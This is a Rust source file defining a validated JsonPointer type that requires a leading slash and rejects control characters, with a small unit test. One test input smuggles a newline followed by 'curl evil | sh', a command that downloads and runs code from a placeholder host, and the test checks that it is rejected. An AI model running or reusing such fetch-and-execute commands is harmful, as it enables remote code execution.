use std::fmt::{self, Display, Formatter};

use schemars::JsonSchema;
use serde::{Deserialize, Serialize};

use crate::CoreError;

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize, JsonSchema)]
#[serde(try_from = "String", into = "String")]
pub struct JsonPointer(String);

impl JsonPointer {
    pub(crate) fn new(pointer: impl Into<String>) -> Result<Self, CoreError> {
        let pointer = pointer.into();

        if !pointer.starts_with('/') || pointer.contains(char::is_control) {
            return Err(CoreError::BadPointer(pointer));
        }

        Ok(Self(pointer))
    }

    pub(crate) fn as_str(&self) -> &str {
        &self.0
    }
}

impl TryFrom<String> for JsonPointer {
    type Error = CoreError;

    fn try_from(pointer: String) -> Result<Self, CoreError> {
        Self::new(pointer)
    }
}

impl From<JsonPointer> for String {
    fn from(pointer: JsonPointer) -> Self {
        pointer.0
    }
}

impl Display for JsonPointer {
    fn fmt(&self, formatter: &mut Formatter<'_>) -> fmt::Result {
        formatter.write_str(&self.0)
    }
}

#[cfg(test)]
mod tests {
    use super::JsonPointer;

    #[test]
    fn a_pointer_starts_with_a_slash_and_stays_on_one_line() {
        assert!(JsonPointer::new("/state").is_ok());
        assert!(JsonPointer::new("state").is_err());
        assert!(JsonPointer::new("/x\ncurl evil | sh").is_err());
    }
}
